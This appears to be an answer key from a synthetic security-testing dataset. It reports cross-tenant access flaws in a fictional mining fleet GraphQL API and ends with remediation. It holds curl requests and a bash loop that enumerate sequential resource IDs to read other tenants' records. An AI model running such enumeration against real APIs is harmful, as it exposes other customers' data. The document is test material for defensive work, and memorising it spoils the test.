# Expected Response

## System
- System: OreTrack Fleet Management v2.9.4
- Domain: MINING / RESOURCE EXTRACTION
- Example ID: GQL-0425
- Risk ID: RISK-GQL-425

## Findings

### 1. Pattern 1.8 — Predictable Sequential IDs Enable Systematic Enumeration: `bulkResourceLookup` (HAR Primary)

Resource IDs follow a sequential format `R-{number}` (R-1425, R-2425, R-3425 observed in HAR). This makes IDs predictable and enumerable. Combined with the missing per-ID ownership filter in `bulkResourceLookup`, an attacker can systematically enumerate all mining fleet/IoT records across tenants by incrementing the numeric ID component.

HAR shows `bulkResourceLookup` with IDs `["R-2425", "R-1425", "R-3425"]` from `tenant-8369`. Response contains `getResource` data for `tenant-c0d0` (response wrapper mismatch is a synthetic artifact; the cross-tenant `tenantId` in the response is the authoritative evidence of the bypass).

```bash
# Bulk sequential enumeration of cross-tenant fleet records
curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8369>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-8369" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2425\", \"R-1425\", \"R-3425\"]) { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-c0d0"` records — cross-tenant mining fleet data exposed via sequential ID enumeration.

### 2. Single-ID Cross-Tenant Read — `getResource` (RISK-GQL-425)

```bash
curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8369>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-8369" \
  -d '{"query": "query { getResource(id: \"R-2425\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```

### 3. Redis Cache Mining Data Leak

Cache key is `resourceId` only. Sequential IDs make cache poisoning straightforward — an attacker who accesses `R-2425` may receive another tenant's cached fleet telemetry record.

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8369>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-8369" \
  -d '{"query": "query { getResource(id: \"R-1425\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
```
**Expected:** Returns `tenantId: "tenant-8369"`.

**Step 2 — Sequential ID enumeration via bulk lookup (primary HAR attack):**
```bash
curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8369>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-8369" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2425\", \"R-1425\", \"R-3425\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns records from multiple tenants including `tenantId: "tenant-c0d0"`.

**Step 3 — Systematic single-step enumeration using sequential IDs:**
```bash
# Iterate: R-2420, R-2421, ..., R-2430 — each returns a different tenant's record
for id in R-2420 R-2421 R-2422 R-2423 R-2424 R-2426 R-2427 R-2428; do
  curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
    -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8369>" \
    -H "Content-Type: application/json" \
    -H "x-tenant-id: tenant-8369" \
    -d "{\"query\": \"query { getResource(id: \\\"$id\\\") { resourceId tenantId data { sensitiveField } } }\"}"
done
```

## Secure Outcome Verification
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": null }
```

## Remediation
- Resolver-level tenant check: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` in `getResource` (RISK-GQL-425).
- Per-ID ownership filter in `bulkResourceLookup`: post-fetch filter by JWT `tenantId`.
- Use non-sequential UUIDs for resource IDs to prevent enumeration.
- Fix Redis cache key: include `tenantId` (e.g., `resource:{tenantId}:{resourceId}`).
